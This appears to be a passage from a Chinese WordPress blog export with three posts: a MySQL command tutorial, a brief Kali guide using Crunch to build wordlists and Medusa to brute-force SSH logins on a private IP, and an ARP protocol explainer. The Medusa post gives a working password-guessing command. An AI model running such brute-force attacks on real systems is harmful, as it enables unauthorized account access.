<h3><span data-wiz-span="data-wiz-span"><b>创建一个数据库：</b></span></h3>

<div><span data-wiz-span="data-wiz-span">create database 数据库名</span><span data-wiz-span="data-wiz-span">
</span></div>

<div></div>

<div></div>

<div></div>

<h3><span data-wiz-span="data-wiz-span"><b>创建数据库并分配用户：</b></span></h3>

<div><span data-wiz-span="data-wiz-span">①CREATE DATABASE 数据库名;</span></div>

<div><span data-wiz-span="data-wiz-span">②GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON 数据库名.* TO 数据库名@localhost IDENTIFIED BY '密码';</span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span">③SET PASSWORD FOR '数据库名'@'localhost' = OLD_PASSWORD('密码');</span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<h3><span data-wiz-span="data-wiz-span"><b>删除一个数据库：</b></span></h3>

<div><span data-wiz-span="data-wiz-span">drop database 数据库名</span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<h3><span data-wiz-span="data-wiz-span"><b>使用数据库：</b></span></h3>

<div><span data-wiz-span="data-wiz-span">use 数据库名</span></div>

<div></div>

<div></div>

<div></div>

<div></div>

<div>
<h3 id="comment"><span data-wiz-span="data-wiz-span"><b>select的多种用法：</b></span></h3>
<div id="comment">
<span data-wiz-span="data-wiz-span">MySQL中SELECT命令类似于其他编程语言里的print或者write，你可以用它来显示一个字符串、数字、数学表达式的结果等等。如何使用MySQL中SELECT命令的特殊功能？</span>
<span data-wiz-span="data-wiz-span">1.显示MYSQL的版本</span>
<span data-wiz-span="data-wiz-span">mysql&gt; select version(); </span>
<span data-wiz-span="data-wiz-span">+-------------------------+ </span>
<span data-wiz-span="data-wiz-span">| version()                      | </span>
<span data-wiz-span="data-wiz-span">+-------------------------+ </span>
<span data-wiz-span="data-wiz-span">| 6.0.4-alpha-community | </span>
<span data-wiz-span="data-wiz-span">+-------------------------+ </span>
<span data-wiz-span="data-wiz-span">1 row in set (0.02 sec) </span>
<span data-wiz-span="data-wiz-span">2.显示当前时间</span>
<span data-wiz-span="data-wiz-span">mysql&gt; select now(); </span>
<span data-wiz-span="data-wiz-span">+-----------------------+ </span>
<span data-wiz-span="data-wiz-span">| now()                       | </span>
<span data-wiz-span="data-wiz-span">+-----------------------+ </span>
<span data-wiz-span="data-wiz-span">| 2009-09-15 22:35:32 | </span>
<span data-wiz-span="data-wiz-span">+-----------------------+ </span>
<span data-wiz-span="data-wiz-span">1 row in set (0.04 sec) </span>
<span data-wiz-span="data-wiz-span">3.显示年月日</span>
<span data-wiz-span="data-wiz-span">SELECT DAYOFMONTH(CURRENT_DATE); </span>
<span data-wiz-span="data-wiz-span">+------------------------------------+ </span>
<span data-wiz-span="data-wiz-span">| DAYOFMONTH(CURRENT_DATE) | </span>
<span data-wiz-span="data-wiz-span">+------------------------------------+ </span>
<span data-wiz-span="data-wiz-span">|                       15                        | </span>
<span data-wiz-span="data-wiz-span">+------------------------------------+ </span>
<span data-wiz-span="data-wiz-span">1 row in set (0.01 sec) </span>
<span data-wiz-span="data-wiz-span">  </span>
<span data-wiz-span="data-wiz-span">SELECT MONTH(CURRENT_DATE); </span>
<span data-wiz-span="data-wiz-span">+----------------------------+ </span>
<span data-wiz-span="data-wiz-span">| MONTH(CURRENT_DATE) | </span>
<span data-wiz-span="data-wiz-span">+----------------------------+ </span>
<span data-wiz-span="data-wiz-span">|                   9                   | </span>
<span data-wiz-span="data-wiz-span">+----------------------------+ </span>
<span data-wiz-span="data-wiz-span">1 row in set (0.00 sec) </span>
<span data-wiz-span="data-wiz-span">  </span>
<span data-wiz-span="data-wiz-span">SELECT YEAR(CURRENT_DATE); </span>
<span data-wiz-span="data-wiz-span">+-------------------------+ </span>
<span data-wiz-span="data-wiz-span">| YEAR(CURRENT_DATE) | </span>
<span data-wiz-span="data-wiz-span">+-------------------------+ </span>
<span data-wiz-span="data-wiz-span">|               2009             | </span>
<span data-wiz-span="data-wiz-span">+-------------------------+ </span>
<span data-wiz-span="data-wiz-span">1 row in set (0.00 sec) </span>
<span data-wiz-span="data-wiz-span">4.显示字符串</span>
<span data-wiz-span="data-wiz-span">mysql&gt; SELECT "welecome to my blog!"; </span>
<span data-wiz-span="data-wiz-span">+------------------------+ </span>
<span data-wiz-span="data-wiz-span">| welecome to my blog! | </span>
<span data-wiz-span="data-wiz-span">+------------------------+ </span>
<span data-wiz-span="data-wiz-span">| welecome to my blog! | </span>
<span data-wiz-span="data-wiz-span">+------------------------+ </span>
<span data-wiz-span="data-wiz-span">1 row in set (0.00 sec) </span>
<span data-wiz-span="data-wiz-span">5.当计算器用</span>
<span data-wiz-span="data-wiz-span">select ((4 * 4) / 10 ) + 25; </span>
<span data-wiz-span="data-wiz-span">+----------------------+ </span>
<span data-wiz-span="data-wiz-span">| ((4 * 4) / 10 ) + 25    | </span>
<span data-wiz-span="data-wiz-span">+----------------------+ </span>
<span data-wiz-span="data-wiz-span">|                26.60       | </span>
<span data-wiz-span="data-wiz-span">+----------------------+ </span>
<span data-wiz-span="data-wiz-span">1 row in set (0.00 sec) </span>
<span data-wiz-span="data-wiz-span">6.串接字符串</span>
<span data-wiz-span="data-wiz-span">select CONCAT(f_name, " ", l_name) </span>
<span data-wiz-span="data-wiz-span">AS Name </span>
<span data-wiz-span="data-wiz-span">from employee_data </span>
<span data-wiz-span="data-wiz-span">where title = 'Marketing Executive'; </span>
<span data-wiz-span="data-wiz-span">+----------------+ </span>
<span data-wiz-span="data-wiz-span">| Name             | </span>
<span data-wiz-span="data-wiz-span">+----------------+ </span>
<span data-wiz-span="data-wiz-span">| Monica Sehgal | </span>
<span data-wiz-span="data-wiz-span">| Hal Simlai        | </span>
<span data-wiz-span="data-wiz-span">| Joseph Irvine   | </span>
<span data-wiz-span="data-wiz-span">+----------------+ </span>
<span data-wiz-span="data-wiz-span">3 rows in set (0.00 sec) </span>
</div>
<div id="comment"><span data-wiz-span="data-wiz-span">注意：这里用到CONCAT()函数，用来把字符串串接起来。另外，我们还用到以前学到的AS给结果列'CONCAT(f_name, " ", l_name)'起了个假名。</span></div>
<div id="comment"></div>
<div id="comment"></div>
<div id="comment"></div>
<h3 id="comment"><span data-wiz-span="data-wiz-span"><b>创建数据表：</b></span></h3>
</div>

<div>
<div id="comment">
<span data-wiz-span="data-wiz-span">create table 表名 ( &lt;字段名&gt; &lt;类型&gt;&lt;长度&gt;);</span>
<span data-wiz-span="data-wiz-span">例如，建立一个名为MyClass的表，</span>
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td><span data-wiz-span="data-wiz-span">字段名</span></td>
<td><span data-wiz-span="data-wiz-span">数字类型</span></td>
<td><span data-wiz-span="data-wiz-span">数据宽度</span></td>
<td><span data-wiz-span="data-wiz-span">是否为空</span></td>
<td><span data-wiz-span="data-wiz-span">是否主键</span></td>
<td><span data-wiz-span="data-wiz-span">自动增加</span></td>
<td><span data-wiz-span="data-wiz-span">默认值</span></td>
</tr>
<tr>
<td><span data-wiz-span="data-wiz-span">id</span></td>
<td><span data-wiz-span="data-wiz-span">int</span></td>
<td><span data-wiz-span="data-wiz-span">4</span></td>
<td><span data-wiz-span="data-wiz-span">否</span></td>
<td><span data-wiz-span="data-wiz-span">primary key</span></td>
<td><span data-wiz-span="data-wiz-span">auto_increment</span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
</tr>
<tr>
<td><span data-wiz-span="data-wiz-span">name</span></td>
<td><span data-wiz-span="data-wiz-span">char</span></td>
<td><span data-wiz-span="data-wiz-span">20</span></td>
<td><span data-wiz-span="data-wiz-span">否</span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
</tr>
<tr>
<td><span data-wiz-span="data-wiz-span">sex</span></td>
<td><span data-wiz-span="data-wiz-span">int</span></td>
<td><span data-wiz-span="data-wiz-span">4</span></td>
<td><span data-wiz-span="data-wiz-span">否</span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
<td><span data-wiz-span="data-wiz-span">0</span></td>
</tr>
<tr>
<td><span data-wiz-span="data-wiz-span">degree</span></td>
<td><span data-wiz-span="data-wiz-span">double</span></td>
<td><span data-wiz-span="data-wiz-span">16</span></td>
<td><span data-wiz-span="data-wiz-span">是</span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
<td><span data-wiz-span="data-wiz-span"> </span></td>
</tr>
</tbody>
</table>
<span data-wiz-span="data-wiz-span">mysql&gt; </span><span data-wiz-span="data-wiz-span">create</span><span data-wiz-span="data-wiz-span"> </span><span data-wiz-span="data-wiz-span">table</span><span data-wiz-span="data-wiz-span"> MyClass(</span>
<span data-wiz-span="data-wiz-span">&gt; id int(4) not null </span><span data-wiz-span="data-wiz-span">primary key auto_increment</span><span data-wiz-span="data-wiz-span">,</span>
<span data-wiz-span="data-wiz-span">&gt; name char(20) not null,</span>
<span data-wiz-span="data-wiz-span">&gt; sex int(4) not null</span><span data-wiz-span="data-wiz-span"> default</span><span data-wiz-span="data-wiz-span"> '0',</span>
<span data-wiz-span="data-wiz-span">&gt; degree double(16,2));</span>
</div>
<div></div>
<div></div>
<h3><b><span data-wiz-span="data-wiz-span">删</span><span data-wiz-span="data-wiz-span">除数据表：</span></b></h3>
</div>

<div><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">drop table 表名</span></span></div>

<div></div>

<div></div>

<div></div>

<h3><span data-wiz-span="data-wiz-span"><b>表插入数据：</b></span></h3>

<div><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">insert into &lt;表名&gt; [( &lt;字段名1&gt;[,..&lt;字段名n &gt; ])] values ( 值1 )[, ( 值n )]</span></span><span data-wiz-span="data-wiz-span">
</span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span">例如：往表 MyClass中插入二条记录, 这二条记录表示：编号为1的名为Tom的成绩为96.45, 编号为2 的名为Joan 的成绩为82.99， 编号为3 的名为Wang 的成绩为96.5。</span>
<span data-wiz-span="data-wiz-span">mysql&gt; insert into MyClass values(1,'Tom',96.45),(2,'Joan',82.99), (2,'Wang', 96.59);</span></div>

<div></div>

<div></div>

<div></div>

<h3><span data-wiz-span="data-wiz-span"><b>查询前几行数据：</b></span></h3>

<div><span data-wiz-span="data-wiz-span">select &lt;字段1，字段2，...&gt; from &lt; 表名 &gt; where &lt; 表达式 &gt;</span></div>

<div><span data-wiz-span="data-wiz-span">例如：查看表 MyClass 中前2行数据</span>
<span data-wiz-span="data-wiz-span">mysql&gt; select * from MyClass order by id limit 0,2;</span><span data-wiz-span="data-wiz-span">select一般配合where使用，以查询更精确更复杂的数据。</span></div>

<div></div>

<div></div>

<div></div>

<h3><strong>删除表中数据</strong></h3>

<span data-wiz-span="data-wiz-span">命令：delete from 表名 where 表达式</span>
<span data-wiz-span="data-wiz-span">例如：删除表 MyClass中编号为1 的记录</span>
<span data-wiz-span="data-wiz-span">mysql&gt; delete from MyClass where id=1;</span>
<span data-wiz-span="data-wiz-span">下面是一个删除数据前后表的对比。</span>

<table>
<tbody>
<tr>
<th><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">FirstName</span></span></th>
<th><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">LastName</span></span></th>
<th><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">Age</span></span></th>
</tr>
<tr>
<td><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">Peter</span></span></td>
<td><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">Griffin</span></span></td>
<td><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">35</span></span></td>
</tr>
<tr>
<td><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">Glenn</span></span></td>
<td><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">Quagmire</span></span></td>
<td><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">33</span></span></td>
</tr>
</tbody>
</table>

<span data-wiz-span="data-wiz-span">下面以PHP代码为例删除 "Persons" 表中所有 LastName='Griffin' 的记录：</span>

<pre><span data-wiz-span="data-wiz-span">&lt;?php
   $con = mysql_connect("localhost","peter","abc123");
   if (!$con)
   {
      die('Could not connect: ' . mysql_error());
   }
   mysql_select_db("my_db", $con);
   mysql_query("</span><span data-wiz-span="data-wiz-span">delete from Persons where LastName='Griffin'</span><span data-wiz-span="data-wiz-span">"); mysql_close($con);
?&gt;</span></pre>

<span data-wiz-span="data-wiz-span">在这次删除之后，表是这样的：</span>

<table>
<tbody>
<tr>
<th><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">FirstName</span></span></th>
<th><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">LastName</span></span></th>
<th><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">Age</span></span></th>
</tr>
<tr>
<td><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">Glenn</span></span></td>
<td><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">Quagmire</span></span></td>
<td><span data-wiz-span="data-wiz-span">33</span></td>
</tr>
</tbody>
</table>

&nbsp;
&nbsp;

<h3 style="text-align: left;" align="center"><strong><span data-wiz-span="data-wiz-span"><span data-wiz-span="data-wiz-span">修改表中数据</span></span></strong></h3>

<div><span data-wiz-span="data-wiz-span">语法：update 表名 set 字段=新值,… where 条件</span>
<span data-wiz-span="data-wiz-span">例如：update MyClass set name='Mary' where id=1;</span><span data-wiz-span="data-wiz-span">例子1：单表的MySQL UPDATE语句：</span>
<span data-wiz-span="data-wiz-span">   UPDATE [LOW_PRIORITY] [IGNORE] tbl_name SET col_name1=expr1 [, col_name2=expr2 ...] [WHERE where_definition] [ORDER BY ...] [LIMIT row_count]</span><span data-wiz-span="data-wiz-span">例子2：多表的UPDATE语句：</span>
<span data-wiz-span="data-wiz-span">UPDATE [LOW_PRIORITY] [IGNORE] table_references SET col_name1=expr1 [, col_name2=expr2 ...] [WHERE where_definition]</span><span data-wiz-span="data-wiz-span">UPDATE语法可以用新值更新原有表行中的各列。SET子句指示要修改哪些列和要给予哪些值。WHERE子句指定应更新哪些行。如果没有WHERE子句，则更新所有的行。如果指定了ORDER BY子句，则按照被指定的顺序对行进行更新。LIMIT子句用于给定一个限值，限制可以被更新的行的数目。</span></div>

<span data-wiz-span="data-wiz-span"> </span><span data-wiz-span="data-wiz-span"> </span>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

&nbsp;

<div></div>

<span data-wiz-span="data-wiz-span"> </span><span data-wiz-span="data-wiz-span"> </span>

<div></div>

<div></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>117</wp:post_id>
		<wp:post_date><![CDATA[2015-10-14 14:40:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-14 06:40:45]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[117]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[182]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Crunch生成字典+Medusa暴力破解FTP\SSH等</title>
		<link>https://www.nervgeek.com/2015/10/14/crunch%e7%94%9f%e6%88%90%e5%ad%97%e5%85%b8medusa%e6%9a%b4%e5%8a%9b%e7%a0%b4%e8%a7%a3ftpssh%e7%ad%89/</link>
		<pubDate>Wed, 14 Oct 2015 07:32:43 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=124</guid>
		<description></description>
		<content:encoded><![CDATA[<h3><strong>0x01、使用Crunch生成字典</strong></h3>

Crunch是Kali自带的一个字典生成软件，使用方便，生成迅速。
例如我需要生成一个6位的密码，密码组合元素为1234，生成后保存为123.txt

<pre>crunch 1 6 1234 -o 123.txt
</pre>

<strong><span style="color: #ff0000;">1</span></strong>是最少几位密码，<span style="color: #ff0000;"><strong>6</strong></span>是最多几位密码，<strong><span style="color: #ff0000;">-o</span></strong>是输出字典
<a href="https://www.nervgeek.com/wp-content/uploads/2015/10/medusa.png"><img class="alignnone size-full wp-image-125" src="https://www.nervgeek.com/wp-content/uploads/2015/10/medusa.png" alt="medusa" width="696" height="218" /></a>
字典文件保存在当前目录下，当然也可以指定位置。
<!--more-->

<h3><strong>0x02、使用Medusa暴力破解</strong></h3>

Kali里也自带了Medusa，无需另外下载。
命令格式为
medusa -h 目标地址 -u 用户名 -P 字典路径 -f -M 破解方式
例如我需要暴力破解192.168.145.128的ssh，用户名为root，字典放在root下：

<pre>medusa -h 192.168.145.128 -u root -P ./rkolin.txt -f -M ssh
</pre>

-f表示破解成功就立马显示正确密码，并停止破解。
<a href="https://www.nervgeek.com/wp-content/uploads/2015/10/medusa1.png"><img class="alignnone size-full wp-image-126" src="https://www.nervgeek.com/wp-content/uploads/2015/10/medusa1.png" alt="medusa1" width="1276" height="202" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2015/10/medusa2.png"><img class="alignnone size-full wp-image-127" src="https://www.nervgeek.com/wp-content/uploads/2015/10/medusa2.png" alt="medusa2" width="732" height="25" /></a>
破解成功，密码为asdasd。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>124</wp:post_id>
		<wp:post_date><![CDATA[2015-10-14 15:32:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-14 07:32:43]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[crunch%e7%94%9f%e6%88%90%e5%ad%97%e5%85%b8medusa%e6%9a%b4%e5%8a%9b%e7%a0%b4%e8%a7%a3ftpssh%e7%ad%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="crunch"><![CDATA[Crunch]]></category>
		<category domain="post_tag" nicename="medusa"><![CDATA[Medusa]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%a0%b4%e8%a7%a3"><![CDATA[破解]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[309]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>ARP协议剖析</title>
		<link>https://www.nervgeek.com/2015/10/15/arp%e5%8d%8f%e8%ae%ae%e5%89%96%e6%9e%90/</link>
		<pubDate>Thu, 15 Oct 2015 07:40:43 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=131</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>地址解析协议</strong>，即ARP（Address Resolution Protocol），是根据<a href="http://baike.baidu.com/view/3930.htm" target="_blank" rel="nofollow">IP地址</a>获取<a href="http://baike.baidu.com/view/883168.htm" target="_blank" rel="nofollow"><strong>物理地址</strong></a><strong>(MAC地址)</strong>的一个<a href="http://baike.baidu.com/view/7649.htm" target="_blank" rel="nofollow">TCP/IP协议</a>，属于<strong>链路层协议</strong>。其作用是：<a href="http://baike.baidu.com/view/23880.htm" target="_blank" rel="nofollow">主机</a>将ARP请求<a href="http://baike.baidu.com/view/35385.htm" target="_blank" rel="nofollow"><strong>广播</strong></a>到网络上的所有主机，并接收返回消息，确定目标<a href="http://baike.baidu.com/view/3930.htm" target="_blank" rel="nofollow">IP地址</a>的地物理址(MAC地址)，同时将IP地址和硬件地址存入<strong>本机ARP缓存</strong>中，下次请求时直接查询ARP缓存（arp -a）。
之所以需要MAC地址，是因为在网络中交换机使用了<strong>CAM表</strong>，表列出了交换机中的每个端口连接设备的MAC地址，当它收到一个指向某个MAC地址的数据包时，交换机会使用这个表，来确定其发送者。如果该目标MAC地址是未知的，就需要使用ARP协议来获取。
ARP协议的解析过程只使用两种数据包：一个为ARP请求，另一个则是ARP响应。
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/628717c4cdbfb9aadd45a3fc5965f308.jpg" alt="" border="0" hspace="0" vspace="0" />
<!--more-->
在上图中，当<strong>不知道需要请求的IP的MAC</strong>时，主机就会发出一个<strong>ARP请求</strong>(其中包含了自己主机的IP和MAC)，询问IP为192.168.1.120主机的MAC地址（图中忽略了交换机，其实是交换机发出的那多个包），这个数据包将广播到同网段的所有主机，主机们会查看其中的请求，如果不是自己的IP地址就会自动忽略，而拥有这个IP地址的主机将发送的一个<strong>ARP响应</strong>（其中包含了192.168.1.120的MAC地址）。 这样一个解析就完成了。
<strong>1.1 ARP头部</strong>
为了了解ARP的传输过程，现在我们来深入研究ARP头：
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/3-16e5bd8f1eb865d747b3eb459e2492b5-1-1.png" alt="" border="0" hspace="0" vspace="0" />
我们忽略以太网首部，单看ARP格式（图示数字代表其域的字节）：

<ul>
    <li><strong>硬件类型 Hardware type(16bit)：</strong> 数据链路层使用的类型数据。以太网是类型1，值为0x0001。</li>
    <li><strong>协议类型 Protocol type(16bit)：</strong> 定义其高层协议类型。对应IPv4协议，值为0x0800。</li>
    <li><strong>硬件地址长度 Hardware size(8bit)：</strong> 定义以字节为单位的物理(硬件)地址长度，以太网是6。</li>
    <li><strong>协议地址长度 Protocol size(8bit)：</strong> 定义以字节为单位的逻辑(协议)地址长度，即m的值。IPv4的值为4。</li>
    <li><strong>操作码 Opcode(16bit)：</strong> 定义分组的类型。ARP请求为0x0001，ARP应答为0x0002；RARP请求为0x0003，RARP应答为0x0004。</li>
    <li><strong>发送方硬件地址 Source hardware address(48bit)：</strong> 发送者的硬件地址(MAC地址)。</li>
    <li><strong>发送方协议地址 Source IP address(32bit)：</strong> 发送者的高层协议地址(IP地址)。</li>
    <li><strong>目的硬件地址 Target hardware address(48bit)： </strong>目标接收方的硬件地址(MAC地址)。</li>
    <li><strong>目的协议地址 Target IP address(32bit)：</strong>目标接收方的高层协议地址(IP地址)。</li>
</ul>

上面讲解的每个域都能在一一在包中对应
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/5-1fde658c641c9397b8a15238f9db04d9-1-1.png" alt="" border="0" hspace="0" vspace="0" />

<h1>硬件类型为以太网（1），其高层协议为IP（0x0800），硬件地址长度为6（MAC地址为6byte），高层的地址长度为4（就是IP地址为4byte） Opcode表示该包为请求包。</h1>

我们通过ARP请求和ARP响应包来进行详解
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/be11ac9241eb4f7a80300b32cfae21b5.png" alt="" border="0" hspace="0" vspace="0" />
从数据包列表中我们可以看见第一个包为请求包，目的包为广播包，第二为ARP响应包。
<strong>1.2 ARP请求</strong>
我们展开第一个包（其实叫帧，习惯╮(╯<em>╰)╭）：
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/1-12fec68c9d14b27e99fbe8c7e0510164-1-1.png" alt="" border="0" hspace="0" vspace="0" />
其中ARP这一栏中我们可以和上面的ARP头一一对应理解
我们可以发现在这个ARP请求包中包含了源主机的IP及MAC地址，而目标主机的MAC地址为00:00:00:00:00:00 ，表示不知道其MAC地址。
<strong>1.3 ARP响应</strong>
现在我们展开其响应包(我们可以在Opcode域看见 reply)
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/1-1b5882efbb1c58652f6c90b7449d7dfc-1-1.png" alt="" border="0" hspace="0" vspace="0" />
&nbsp;
可以看见主机D-LINK(192.168.0.1)将自己的MAC地址发送给请求主机HonhaiPr</em>(192.168.0.114)，从而完成了一个完整的ARP过程。
<strong>1.4 gratuitous ARP</strong>
免费（无偿）ARP，一般来说，一台主机的IP地址是可以改变的，当这种情况出生后，网络主机中缓存IP和MAC对应的缓存表就不再有效了，所以会有一个无偿的ARP包，强制所以收到它的主机去使用新的IP和MAC地址映射。(很多情况都会产生无偿的ARP包，IP改变只是其中的一个)
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/7de177c6c8322a459a1bbf951b44f3a2.png" alt="" border="0" hspace="0" vspace="0" />
首先我们可以发现这是一个广播，你可以发现它很像ARP请求包，但源IP和目标IP是一致的。所以它也可以用过来监测同网段内是否和本机IP地址一样的主机，有时设备改变了硬件地址，通过发送免费的ARP报文通知其它设备更新其ARP表。
&nbsp;
&nbsp;
转载于：http://metasploit.lofter.com/post/d9d60_1701abd]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>131</wp:post_id>
		<wp:post_date><![CDATA[2015-10-15 15:40:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-15 07:40:43]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[arp%e5%8d%8f%e8%ae%ae%e5%89%96%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="arp"><![CDATA[arp]]></category>
		<category domain="post_tag" nicename="%e5%8d%8f%e8%ae%ae"><![CDATA[协议]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
